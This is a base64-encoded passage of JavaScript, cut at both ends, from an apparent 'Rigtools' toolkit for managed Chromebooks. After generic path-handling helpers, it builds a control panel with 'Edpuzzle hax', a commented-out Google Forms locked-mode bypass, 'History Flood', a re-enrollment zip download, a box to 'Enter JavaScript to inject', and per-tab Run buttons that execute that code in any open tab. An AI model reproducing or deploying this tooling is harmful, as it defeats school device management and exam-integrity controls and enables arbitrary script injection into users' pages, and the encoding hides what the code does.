GZvciAoOyBpIDw9IGxlbmd0aDsgKytpKSB7CiAgICAgICAgICAgIGlmIChpID09PSBsZW5ndGgpIHsKICAgICAgICAgICAgICAgIGlmICh0b0xlbiA+IGxlbmd0aCkgewogICAgICAgICAgICAgICAgICAgIGlmICh0by5jaGFyQ29kZUF0KHRvU3RhcnQgKyBpKSA9PT0gNDcpIHsKCiAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybiB0by5zbGljZSh0b1N0YXJ0ICsgaSArIDEpOwogICAgICAgICAgICAgICAgICAgIH0gZWxzZSBpZiAoaSA9PT0gMCkgewoKICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuIHRvLnNsaWNlKHRvU3RhcnQgKyBpKTsKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICB9IGVsc2UgaWYgKGZyb21MZW4gPiBsZW5ndGgpIHsKICAgICAgICAgICAgICAgICAgICBpZiAoZnJvbS5jaGFyQ29kZUF0KGZyb21TdGFydCArIGkpID09PSA0NykgewoKICAgICAgICAgICAgICAgICAgICAgICAgbGFzdENvbW1vblNlcCA9IGk7CiAgICAgICAgICAgICAgICAgICAgfSBlbHNlIGlmIChpID09PSAwKSB7CgogICAgICAgICAgICAgICAgICAgICAgICBsYXN0Q29tbW9uU2VwID0gMDsKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBicmVhazsKICAgICAgICAgICAgfQogICAgICAgICAgICB2YXIgZnJvbUNvZGUgPSBmcm9tLmNoYXJDb2RlQXQoZnJvbVN0YXJ0ICsgaSk7CiAgICAgICAgICAgIHZhciB0b0NvZGUgPSB0by5jaGFyQ29kZUF0KHRvU3RhcnQgKyBpKTsKICAgICAgICAgICAgaWYgKGZyb21Db2RlICE9PSB0b0NvZGUpCiAgICAgICAgICAgICAgICBicmVhazsKICAgICAgICAgICAgZWxzZSBpZiAoZnJvbUNvZGUgPT09IDQ3KQogICAgICAgICAgICAgICAgbGFzdENvbW1vblNlcCA9IGk7CiAgICAgICAgfQogICAgICAgIHZhciBvdXQgPSAnJzsKCiAgICAgICAgZm9yIChpID0gZnJvbVN0YXJ0ICsgbGFzdENvbW1vblNlcCArIDE7IGkgPD0gZnJvbUVuZDsgKytpKSB7CiAgICAgICAgICAgIGlmIChpID09PSBmcm9tRW5kIHx8IGZyb20uY2hhckNvZGVBdChpKSA9PT0gNDcpIHsKICAgICAgICAgICAgICAgIGlmIChvdXQubGVuZ3RoID09PSAwKQogICAgICAgICAgICAgICAgICAgIG91dCArPSAnLi4nOwogICAgICAgICAgICAgICAgZWxzZQogICAgICAgICAgICAgICAgICAgIG91dCArPSAnLy4uJzsKICAgICAgICAgICAgfQogICAgICAgIH0KCiAgICAgICAgaWYgKG91dC5sZW5ndGggPiAwKQogICAgICAgICAgICByZXR1cm4gb3V0ICsgdG8uc2xpY2UodG9TdGFydCArIGxhc3RDb21tb25TZXApOwogICAgICAgIGVsc2UgewogICAgICAgICAgICB0b1N0YXJ0ICs9IGxhc3RDb21tb25TZXA7CiAgICAgICAgICAgIGlmICh0by5jaGFyQ29kZUF0KHRvU3RhcnQpID09PSA0NykKICAgICAgICAgICAgICAgICsrdG9TdGFydDsKICAgICAgICAgICAgcmV0dXJuIHRvLnNsaWNlKHRvU3RhcnQpOwogICAgICAgIH0KICAgIH0sCiAgICBfbWFrZUxvbmc6IGZ1bmN0aW9uIF9tYWtlTG9uZyhwYXRoKSB7CiAgICAgICAgcmV0dXJuIHBhdGg7CiAgICB9LAogICAgZGlybmFtZTogZnVuY3Rpb24gZGlybmFtZShwYXRoKSB7CiAgICAgICAgYXNzZXJ0UGF0aChwYXRoKTsKICAgICAgICBpZiAocGF0aC5sZW5ndGggPT09IDApIHJldHVybiAnLic7CiAgICAgICAgdmFyIGNvZGUgPSBwYXRoLmNoYXJDb2RlQXQoMCk7CiAgICAgICAgdmFyIGhhc1Jvb3QgPSBjb2RlID09PSA0NzsKICAgICAgICB2YXIgZW5kID0gLTE7CiAgICAgICAgdmFyIG1hdGNoZWRTbGFzaCA9IHRydWU7CiAgICAgICAgZm9yICh2YXIgaSA9IHBhdGgubGVuZ3RoIC0gMTsgaSA+PSAxOyAtLWkpIHsKICAgICAgICAgICAgY29kZSA9IHBhdGguY2hhckNvZGVBdChpKTsKICAgICAgICAgICAgaWYgKGNvZGUgPT09IDQ3KSB7CiAgICAgICAgICAgICAgICBpZiAoIW1hdGNoZWRTbGFzaCkgewogICAgICAgICAgICAgICAgICAgIGVuZCA9IGk7CiAgICAgICAgICAgICAgICAgICAgYnJlYWs7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0gZWxzZSB7CgogICAgICAgICAgICAgICAgbWF0Y2hlZFNsYXNoID0gZmFsc2U7CiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICAgICAgaWYgKGVuZCA9PT0gLTEpIHJldHVybiBoYXNSb290ID8gJy8nIDogJy4nOwogICAgICAgIGlmIChoYXNSb290ICYmIGVuZCA9PT0gMSkgcmV0dXJuICcvLyc7CiAgICAgICAgcmV0dXJuIHBhdGguc2xpY2UoMCwgZW5kKTsKICAgIH0sCiAgICBiYXNlbmFtZTogZnVuY3Rpb24gYmFzZW5hbWUocGF0aCwgZXh0KSB7CiAgICAgICAgaWYgKGV4dCAhPT0gdW5kZWZpbmVkICYmIHR5cGVvZiBleHQgIT09ICdzdHJpbmcnKSB0aHJvdyBuZXcgVHlwZUVycm9yKCciZXh0IiBhcmd1bWVudCBtdXN0IGJlIGEgc3RyaW5nJyk7CgogICAgICAgIHZhciBzdGFydCA9IDA7CiAgICAgICAgdmFyIGVuZCA9IC0xOwogICAgICAgIHZhciBtYXRjaGVkU2xhc2ggPSB0cnVlOwogICAgICAgIHZhciBpOwogICAgICAgIGlmIChleHQgIT09IHVuZGVmaW5lZCAmJiBleHQubGVuZ3RoID4gMCAmJiBleHQubGVuZ3RoIDw9IHBhdGgubGVuZ3RoKSB7CiAgICAgICAgICAgIGlmIChleHQubGVuZ3RoID09PSBwYXRoLmxlbmd0aCAmJiBleHQgPT09IHBhdGgpIHJldHVybiAnJzsKICAgICAgICAgICAgdmFyIGV4dElkeCA9IGV4dC5sZW5ndGggLSAxOwogICAgICAgICAgICB2YXIgZmlyc3ROb25TbGFzaEVuZCA9IC0xOwogICAgICAgICAgICBmb3IgKGkgPSBwYXRoLmxlbmd0aCAtIDE7IGkgPj0gMDsgLS1pKSB7CiAgICAgICAgICAgICAgICB2YXIgY29kZSA9IHBhdGguY2hhckNvZGVBdChpKTsKICAgICAgICAgICAgICAgIGlmIChjb2RlID09PSA0NykgewoKICAgICAgICAgICAgICAgICAgICBpZiAoIW1hdGNoZWRTbGFzaCkgewogICAgICAgICAgICAgICAgICAgICAgICBzdGFydCA9IGkgKyAxOwogICAgICAgICAgICAgICAgICAgICAgICBicmVhazsKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAgICAgICAgIGlmIChmaXJzdE5vblNsYXNoRW5kID09PSAtMSkgewoKICAgICAgICAgICAgICAgICAgICAgICAgbWF0Y2hlZFNsYXNoID0gZmFsc2U7CiAgICAgICAgICAgICAgICAgICAgICAgIGZpcnN0Tm9uU2xhc2hFbmQgPSBpICsgMTsKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgaWYgKGV4dElkeCA+PSAwKSB7CgogICAgICAgICAgICAgICAgICAgICAgICBpZiAoY29kZSA9PT0gZXh0LmNoYXJDb2RlQXQoZXh0SWR4KSkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgKC0tZXh0SWR4ID09PSAtMSkgewoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbmQgPSBpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICB9IGVsc2UgewoKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGV4dElkeCA9IC0xOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgZW5kID0gZmlyc3ROb25TbGFzaEVuZDsKICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQogICAgICAgICAgICBpZiAoc3RhcnQgPT09IGVuZCkgZW5kID0gZmlyc3ROb25TbGFzaEVuZDsKICAgICAgICAgICAgZWxzZSBpZiAoZW5kID09PSAtMSkgZW5kID0gcGF0aC5sZW5ndGg7CiAgICAgICAgICAgIHJldHVybiBwYXRoLnNsaWNlKHN0YXJ0LCBlbmQpOwogICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgIGZvciAoaSA9IHBhdGgubGVuZ3RoIC0gMTsgaSA+PSAwOyAtLWkpIHsKICAgICAgICAgICAgICAgIGlmIChwYXRoLmNoYXJDb2RlQXQoaSkgPT09IDQ3KSB7CgogICAgICAgICAgICAgICAgICAgIGlmICghbWF0Y2hlZFNsYXNoKSB7CiAgICAgICAgICAgICAgICAgICAgICAgIHN0YXJ0ID0gaSArIDE7CiAgICAgICAgICAgICAgICAgICAgICAgIGJyZWFrOwogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIH0gZWxzZSBpZiAoZW5kID09PSAtMSkgewoKICAgICAgICAgICAgICAgICAgICBtYXRjaGVkU2xhc2ggPSBmYWxzZTsKICAgICAgICAgICAgICAgICAgICBlbmQgPSBpICsgMTsKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQogICAgICAgICAgICBpZiAoZW5kID09PSAtMSkgcmV0dXJuICcnOwogICAgICAgICAgICByZXR1cm4gcGF0aC5zbGljZShzdGFydCwgZW5kKTsKICAgICAgICB9CiAgICB9LAogICAgZXh0bmFtZTogZnVuY3Rpb24gZXh0bmFtZShwYXRoKSB7CiAgICAgICAgYXNzZXJ0UGF0aChwYXRoKTsKICAgICAgICB2YXIgc3RhcnREb3QgPSAtMTsKICAgICAgICB2YXIgc3RhcnRQYXJ0ID0gMDsKICAgICAgICB2YXIgZW5kID0gLTE7CiAgICAgICAgdmFyIG1hdGNoZWRTbGFzaCA9IHRydWU7CgogICAgICAgIHZhciBwcmVEb3RTdGF0ZSA9IDA7CiAgICAgICAgZm9yICh2YXIgaSA9IHBhdGgubGVuZ3RoIC0gMTsgaSA+PSAwOyAtLWkpIHsKICAgICAgICAgICAgdmFyIGNvZGUgPSBwYXRoLmNoYXJDb2RlQXQoaSk7CiAgICAgICAgICAgIGlmIChjb2RlID09PSA0NykgewoKICAgICAgICAgICAgICAgIGlmICghbWF0Y2hlZFNsYXNoKSB7CiAgICAgICAgICAgICAgICAgICAgc3RhcnRQYXJ0ID0gaSArIDE7CiAgICAgICAgICAgICAgICAgICAgYnJlYWs7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBjb250aW51ZTsKICAgICAgICAgICAgfQogICAgICAgICAgICBpZiAoZW5kID09PSAtMSkgewoKICAgICAgICAgICAgICAgIG1hdGNoZWRTbGFzaCA9IGZhbHNlOwogICAgICAgICAgICAgICAgZW5kID0gaSArIDE7CiAgICAgICAgICAgIH0KICAgICAgICAgICAgaWYgKGNvZGUgPT09IDQ2KSB7CgogICAgICAgICAgICAgICAgaWYgKHN0YXJ0RG90ID09PSAtMSkKICAgICAgICAgICAgICAgICAgICBzdGFydERvdCA9IGk7CiAgICAgICAgICAgICAgICBlbHNlIGlmIChwcmVEb3RTdGF0ZSAhPT0gMSkKICAgICAgICAgICAgICAgICAgICBwcmVEb3RTdGF0ZSA9IDE7CiAgICAgICAgICAgIH0gZWxzZSBpZiAoc3RhcnREb3QgIT09IC0xKSB7CgogICAgICAgICAgICAgICAgcHJlRG90U3RhdGUgPSAtMTsKICAgICAgICAgICAgfQogICAgICAgIH0KICAgICAgICBpZiAoc3RhcnREb3QgPT09IC0xIHx8IGVuZCA9PT0gLTEgfHwKCiAgICAgICAgICAgIHByZURvdFN0YXRlID09PSAwIHx8CgogICAgICAgICAgICBwcmVEb3RTdGF0ZSA9PT0gMSAmJiBzdGFydERvdCA9PT0gZW5kIC0gMSAmJiBzdGFydERvdCA9PT0gc3RhcnRQYXJ0ICsgMSkgewogICAgICAgICAgICByZXR1cm4gJyc7CiAgICAgICAgfQogICAgICAgIHJldHVybiBwYXRoLnNsaWNlKHN0YXJ0RG90LCBlbmQpOwogICAgfSwKICAgIGZvcm1hdDogZnVuY3Rpb24gZm9ybWF0KHBhdGhPYmplY3QpIHsKICAgICAgICBpZiAocGF0aE9iamVjdCA9PT0gbnVsbCB8fCB0eXBlb2YgcGF0aE9iamVjdCAhPT0gJ29iamVjdCcpIHsKICAgICAgICAgICAgdGhyb3cgbmV3IFR5cGVFcnJvcignVGhlICJwYXRoT2JqZWN0IiBhcmd1bWVudCBtdXN0IGJlIG9mIHR5cGUgT2JqZWN0LiBSZWNlaXZlZCB0eXBlICcgKyB0eXBlb2YgcGF0aE9iamVjdCk7CiAgICAgICAgfQogICAgICAgIHJldHVybiBfZm9ybWF0KCcvJywgcGF0aE9iamVjdCk7CiAgICB9LAogICAgcGFyc2U6IGZ1bmN0aW9uIHBhcnNlKHBhdGgpIHsKICAgICAgICBhc3NlcnRQYXRoKHBhdGgpOwogICAgICAgIHZhciByZXQgPSB7CiAgICAgICAgICAgIHJvb3Q6ICcnLAogICAgICAgICAgICBkaXI6ICcnLAogICAgICAgICAgICBiYXNlOiAnJywKICAgICAgICAgICAgZXh0OiAnJywKICAgICAgICAgICAgbmFtZTogJycKICAgICAgICB9OwogICAgICAgIGlmIChwYXRoLmxlbmd0aCA9PT0gMCkgcmV0dXJuIHJldDsKICAgICAgICB2YXIgY29kZSA9IHBhdGguY2hhckNvZGVBdCgwKTsKICAgICAgICB2YXIgaXNBYnNvbHV0ZSA9IGNvZGUgPT09IDQ3OwogICAgICAgIHZhciBzdGFydDsKICAgICAgICBpZiAoaXNBYnNvbHV0ZSkgewogICAgICAgICAgICByZXQucm9vdCA9ICcvJzsKICAgICAgICAgICAgc3RhcnQgPSAxOwogICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgIHN0YXJ0ID0gMDsKICAgICAgICB9CiAgICAgICAgdmFyIHN0YXJ0RG90ID0gLTE7CiAgICAgICAgdmFyIHN0YXJ0UGFydCA9IDA7CiAgICAgICAgdmFyIGVuZCA9IC0xOwogICAgICAgIHZhciBtYXRjaGVkU2xhc2ggPSB0cnVlOwogICAgICAgIHZhciBpID0gcGF0aC5sZW5ndGggLSAxOwoKICAgICAgICB2YXIgcHJlRG90U3RhdGUgPSAwOwoKICAgICAgICBmb3IgKDsgaSA+PSBzdGFydDsgLS1pKSB7CiAgICAgICAgICAgIGNvZGUgPSBwYXRoLmNoYXJDb2RlQXQoaSk7CiAgICAgICAgICAgIGlmIChjb2RlID09PSA0NykgewoKICAgICAgICAgICAgICAgIGlmICghbWF0Y2hlZFNsYXNoKSB7CiAgICAgICAgICAgICAgICAgICAgc3RhcnRQYXJ0ID0gaSArIDE7CiAgICAgICAgICAgICAgICAgICAgYnJlYWs7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBjb250aW51ZTsKICAgICAgICAgICAgfQogICAgICAgICAgICBpZiAoZW5kID09PSAtMSkgewoKICAgICAgICAgICAgICAgIG1hdGNoZWRTbGFzaCA9IGZhbHNlOwogICAgICAgICAgICAgICAgZW5kID0gaSArIDE7CiAgICAgICAgICAgIH0KICAgICAgICAgICAgaWYgKGNvZGUgPT09IDQ2KSB7CgogICAgICAgICAgICAgICAgaWYgKHN0YXJ0RG90ID09PSAtMSkgc3RhcnREb3QgPSBpOwogICAgICAgICAgICAgICAgZWxzZSBpZiAocHJlRG90U3RhdGUgIT09IDEpIHByZURvdFN0YXRlID0gMTsKICAgICAgICAgICAgfSBlbHNlIGlmIChzdGFydERvdCAhPT0gLTEpIHsKCiAgICAgICAgICAgICAgICBwcmVEb3RTdGF0ZSA9IC0xOwogICAgICAgICAgICB9CiAgICAgICAgfQogICAgICAgIGlmIChzdGFydERvdCA9PT0gLTEgfHwgZW5kID09PSAtMSB8fAoKICAgICAgICAgICAgcHJlRG90U3RhdGUgPT09IDAgfHwKCiAgICAgICAgICAgIHByZURvdFN0YXRlID09PSAxICYmIHN0YXJ0RG90ID09PSBlbmQgLSAxICYmIHN0YXJ0RG90ID09PSBzdGFydFBhcnQgKyAxKSB7CiAgICAgICAgICAgIGlmIChlbmQgIT09IC0xKSB7CiAgICAgICAgICAgICAgICBpZiAoc3RhcnRQYXJ0ID09PSAwICYmIGlzQWJzb2x1dGUpIHJldC5iYXNlID0gcmV0Lm5hbWUgPSBwYXRoLnNsaWNlKDEsIGVuZCk7CiAgICAgICAgICAgICAgICBlbHNlIHJldC5iYXNlID0gcmV0Lm5hbWUgPSBwYXRoLnNsaWNlKHN0YXJ0UGFydCwgZW5kKTsKICAgICAgICAgICAgfQogICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgIGlmIChzdGFydFBhcnQgPT09IDAgJiYgaXNBYnNvbHV0ZSkgewogICAgICAgICAgICAgICAgcmV0Lm5hbWUgPSBwYXRoLnNsaWNlKDEsIHN0YXJ0RG90KTsKICAgICAgICAgICAgICAgIHJldC5iYXNlID0gcGF0aC5zbGljZSgxLCBlbmQpOwogICAgICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAgICAgcmV0Lm5hbWUgPSBwYXRoLnNsaWNlKHN0YXJ0UGFydCwgc3RhcnREb3QpOwogICAgICAgICAgICAgICAgcmV0LmJhc2UgPSBwYXRoLnNsaWNlKHN0YXJ0UGFydCwgZW5kKTsKICAgICAgICAgICAgfQogICAgICAgICAgICByZXQuZXh0ID0gcGF0aC5zbGljZShzdGFydERvdCwgZW5kKTsKICAgICAgICB9CiAgICAgICAgaWYgKHN0YXJ0UGFydCA+IDApIHJldC5kaXIgPSBwYXRoLnNsaWNlKDAsIHN0YXJ0UGFydCAtIDEpOwogICAgICAgIGVsc2UgaWYgKGlzQWJzb2x1dGUpIHJldC5kaXIgPSAnLyc7CiAgICAgICAgcmV0dXJuIHJldDsKICAgIH0sCiAgICBzZXA6ICcvJywKICAgIGRlbGltaXRlcjogJzonLAogICAgd2luMzI6IG51bGwsCiAgICBwb3NpeDogbnVsbAp9Owpjb25zdCBzbGlkZXMgPSBbXTsKbGV0IGFjdGl2ZVNsaWRlSWR4ID0gMDsKY29uc3QgaGFuZGxlQ2FsbGJhY2tzXyA9IFtdOwpjb25zdCBXQUlUX0ZPUl9GSU5JU0ggPSAxOwpyZXF1ZXN0QW5pbWF0aW9uRnJhbWUoZnVuY3Rpb24gYSh0KSB7CiAgICBmb3IgKGNvbnN0IGNiIG9mIGhhbmRsZUNhbGxiYWNrc18pIHsKICAgICAgICBsZXQgbTsKICAgICAgICBpZiAoKG0gPSBjYi5mLmFwcGx5KG51bGwsIFt0IC0gY2IudF0pKSkgewogICAgICAgICAgICBpZiAobSA9PT0gMSkgewogICAgICAgICAgICAgICAgcmV0dXJuOwogICAgICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAgICAgaGFuZGxlQ2FsbGJhY2tzXy5zcGxpY2UoaGFuZGxlQ2FsbGJhY2tzXy5pbmRleE9mKGNiKSwgMSk7CiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICB9CiAgICByZXF1ZXN0QW5pbWF0aW9uRnJhbWUoYSk7Cn0pOwpjb25zdCBoYW5kbGVJbkFuaW1hdGlvbkZyYW1lID0gKGNiLCB0aGl6ID0gbnVsbCwgYXJncyA9IFtdKSA9PiB7CiAgICBoYW5kbGVDYWxsYmFja3NfLnB1c2goewogICAgICAgIGY6IGNiLAogICAgICAgIHQ6IHBlcmZvcm1hbmNlLm5vdygpLAogICAgfSk7Cn07CgpjbGFzcyBEZWZhdWx0RXh0ZW5zaW9uQ2FwYWJpbGl0aWVzIHsKICAgIHN0YXRpYyB0ZW1wbGF0ZSA9IGAKICA8dGl0bGU+VW50aXRsZWQgRG9jdW1lbnQ8L3RpdGxlPgogIDxsaW5rIHJlbD0iaWNvbiIgdHlwZT0iaW1hZ2UveC1pY29uIiBocmVmPSJodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vVDNNMU40TC9yaWd0b29scy11cGRhdGVkLXVpL3JlZnMvaGVhZHMvbWFpbi9kb2NzLmljbyI+CiAgPGRpdiBpZD0iZXh0X2RlZmF1bHQiPgogICAgPGRpdiBpZD0iZGVmYXVsdF9leHRlbnNpb25fY2FwYWJpbGl0aWVzIj4KICAgICAgPGRpdiBjbGFzcz0iaGVhZGVyIj4KICAgICAgICA8aW1nIHNyYz0iaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL1QzTTFONEwvcmlndG9vbHMtdXBkYXRlZC11aS9yZWZzL2hlYWRzL21haW4vcmlndG9vbHMtYm91bmNlLmdpZiIgYWx0PSJSaWd0b29scyBMb2dvIiBjbGFzcz0ibG9nbyIgLz4KICAgICAgICA8aDE+IERlZmF1bHQgRXh0ZW5zaW9uIENhcGFiaWxpdGllcyA8L2gxPgogICAgICA8L2Rpdj4KICAgICAgPGRpdiBpZD0idGFicy1idXR0b25zIj4KICAgICAgICA8cD5PbiB0YWIgdXBkYXRlPC9wPgogICAgICAgIDxkaXYgaWQ9InRvZ2dsZWFibGUtYnV0dG9ucyI+IAoJCTx3aGl0ZWJ1dHRvbnM+CiAgICAgICAgICA8YnV0dG9uIGlkPSJlcnVkYSI+RXJ1ZGE8L2J1dHRvbj4KICAgICAgICAgIDxidXR0b24gaWQ9ImNoaWkiPkNoaWk8L2J1dHRvbj4KICAgICAgICAgIDxidXR0b24gaWQ9ImFkYmxvY2siPkFkYmxvY2s8L2J1dHRvbj4KICAgICAgICAgIDxidXR0b24gaWQ9ImVkcHV6emxlIj5FZHB1enpsZSBoYXg8L2J1dHRvbj4KICAgICAgICAgIDwhLS0gPGJ1dHRvbiBpZD0iZ2xvY2tlZCI+R2Zvcm1zIExvY2tlZCBNb2RlIGJ5cGFzczwvYnV0dG9uPiAtLT4KCQk8L3doaXRlYnV0dG9ucz4KICAgICAgICA8L2Rpdj4KICAgICAgPC9kaXY+CiAgICAgIDxkaXYgaWQ9Im90aGVyLWJ1dHRvbnMiPgogICAgICAgIDxwPk90aGVyIHNjcmlwdHM8L3A+CgkJPHdoaXRlYnV0dG9ucz4KICAgICAgICA8YnV0dG9uIGlkPSJzd2FtcCI+U3dhbXA8L2J1dHRvbj4KICAgICAgICA8YnV0dG9uIGlkPSJ1cGRhdGUiPlVwZGF0ZSBSaWd0b29sczwvYnV0dG9uPgogICAgICAgIDxidXR0b24gaWQ9InF1aWNrLXJtdi1ibHQiPlF1aWNrIFJlbW92ZSBCbG9hdCAodXNlZCB3LyBnZm9ybXMgZXh0ZW4pPC9idXR0b24+CiAgICAgICAgPGJ1dHRvbiBpZD0iaHN0ZmxkIj5IaXN0b3J5IEZsb29kPC9idXR0b24+CgkJPC93aGl0ZWJ1dHRvbnM+CiAgICAgIDwvZGl2PgogICAgICA8aDI+RXZhbHVhdGUgY29kZTwvaDE+CiAgICAgICAgPGRpdiBjbGFzcz0iY29udGFpbmVyIj4KICAgICAgICAgIDx0ZXh0YXJlYSBpZD0iY29kZSIgcGxhY2Vob2xkZXI9IkVudGVyIEphdmFTY3JpcHQgdG8gaW5qZWN0Ij48L3RleHRhcmVhPgogICAgICAgIDwvZGl2PgogICAgICAgIDxidXR0b24gaWQ9ImNvZGUtcnVuIj5SdW48L2J1dHRvbj4KICAgICAgICAgPGgyPiBSaWllbnJvbGxtZW50IDwvaDI+CiAgICAgICAgPGJ1dHRvbiBpZD0iZm9ycmVlbnJvbGwiPiBEb3dubG9hZCB6aXAgPC9idXR0b24+CiAgICAgICAgPGRpdiBpZD0iY29kZS1vdXRwdXQiPjwvZGl2PgoKICAgIDwvZGl2PgogICAgPGRpdiBpZD0iZXh0ZW5zaW9uX3RhYnNfZGVmYXVsdCI+CiAgICAgIDxidXR0b24gaWQ9InRhYnJlbG9hZCI+UmVmcmVzaCBUYWJzPC9idXR0b24+CiAgICAgIDx1bD4KICAgICAgPC91bD4KICAgICAgPGlucHV0IGlkPSJUYWJVUkxJbnB1dCIvPiA8YnV0dG9uIGlkPSJUYWJVUkxTdWJtaXQiPkNyZWF0ZTwvYnV0dG9uPgogICAgPC9kaXY+CiAgPC9kaXY+CiAgYDsKICAgIHVwZGF0ZVRhYkxpc3QoKSB7CiAgICAgICAgaWYgKHRoaXMuZGlzYXJtZWQpIHsKICAgICAgICAgICAgcmV0dXJuOwogICAgICAgIH0KCiAgICAgICAgaWYgKHRoaXMudGFiTGlzdEluUHJvZ3Jlc3MpIHsKCiAgICAgICAgICAgIHJldHVybjsKICAgICAgICB9CiAgICAgICAgdGhpcy50YWJMaXN0SW5Qcm9ncmVzcyA9IHRydWU7CgogICAgICAgIGNvbnN0IHRhYmxpc3QgPSBkb2N1bWVudC5ib2R5LnF1ZXJ5U2VsZWN0b3IoIiNleHRlbnNpb25fdGFic19kZWZhdWx0IHVsIik7CgogICAgICAgIHRhYmxpc3QuaW5uZXJIVE1MID0gIiI7CiAgICAgICAgY29uc3QgdGhpeiA9IHRoaXM7CiAgICAgICAgY2hyb21lLndpbmRvd3MuZ2V0QWxsKGZ1bmN0aW9uKHdpbikgewogICAgICAgICAgICB3aW4uZm9yRWFjaChmdW5jdGlvbih2KSB7CiAgICAgICAgICAgICAgICBjaHJvbWUudGFicy5xdWVyeSh7CiAgICAgICAgICAgICAgICAgICAgd2luZG93SWQ6IHYuaWQKICAgICAgICAgICAgICAgIH0sIGZ1bmN0aW9uKHRhYkluZm9zKSB7CiAgICAgICAgICAgICAgICAgICAgdGFiSW5mb3MuZm9yRWFjaChmdW5jdGlvbihpbmZvKSB7CiAgICAgICAgICAgICAgICAgICAgICAgIGNvbnN0IGRpdiA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoImRpdiIpOwogICAgICAgICAgICAgICAgICAgICAgICBkaXYuY2xhc3NOYW1lID0gInRhYmxpc3QtaXRlbSI7CiAgICAgICAgICAgICAgICAgICAgICAgIGRpdi5pbm5lckhUTUwgPSBgPGltZyAkewogICAgICAgICAgICAgIGNocm9tZS50YWJzICYmIChpbmZvLmZhdkljb25Vcmw/Lmxlbmd0aCA/PyAwKSA+IDAKICAgICAgICAgICAgICAgID8gYHNyYz0iJHtpbmZvLmZhdkljb25Vcmx9ImAKICAgICAgICAgICAgICAgIDogIiIKICAgICAgICAgICAgfS8+PHNwYW4gY2xhc3M9InRhYi1uYW1lIj4ke2luZm8udGl0bGV9IDxsaXRzdHVmZj4gJHtpbmZvLnVybH08bGl0c3R1ZmY+PC9zcGFuPmA7CiAgICAgICAgICAgICAgICAgICAgICAgIGlmIChjaHJvbWUuc2NyaXB0aW5nIHx8IGNocm9tZS50YWJzLmV4ZWN1dGVTY3JpcHQpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNvbnN0IHJ1bkJ1dHRvbiA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoImJ1dHRvbiIpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgcnVuQnV0dG9uLnRleHRDb250ZW50ID0gIlJ1biI7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBydW5CdXR0b24ub25jbGljayA9ICgpID0+IHJ1bkNvZGUodHJ1ZSwgaW5mby5pZCk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBkaXYuYXBwZW5kQ2hpbGQocnVuQnV0dG9uKTsKICAgICAgICAgICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgICAgICAgICAgY29uc3QgcHJldmlld0J1dHRvbiA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoImJ1dHRvbiIpOwogICAgICAgICAgICAgICAgICAgICAgICBwcmV2aWV3QnV0dG9uLnRleHRDb250ZW50ID0gIlByZXZpZXciOwoKICAgICAgICAgICAgICAgICAgICAgICAgcHJldmlld0J1dHRvbi5vbmNsaWNrID0gKCkgPT4gewogICAgICAgICAgICAgICAgICAgICAgICAgICAgdGhpei5kaXNhcm0gPSB0cnVlOwoKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRoaXoucHJldmlld2luZyA9IHRydWU7CgogICAgICAgICAgICAgICAgICAgICAgICAgICAgY2hyb21lLndpbmRvd3MudXBkYXRlKAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGluZm8ud2luZG93SWQsIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZm9jdXNlZDogdHJ1ZSwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9LAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZ1bmN0aW9uKCkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBjaHJvbWUudGFicy51cGRhdGUoaW5mby5pZCwgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgYWN0aXZlOiB0cnVlCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0pOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICB3aW5kb3cuY3VycmVudFRpbWVvdXQgPSBzZXRUaW1lb3V0KGZ1bmN0aW9uIG0oKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgY2xlYXJUaW1lb3V0KHdpbmRvdy5jdXJyZW50VGltZW91dCk7CgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNoc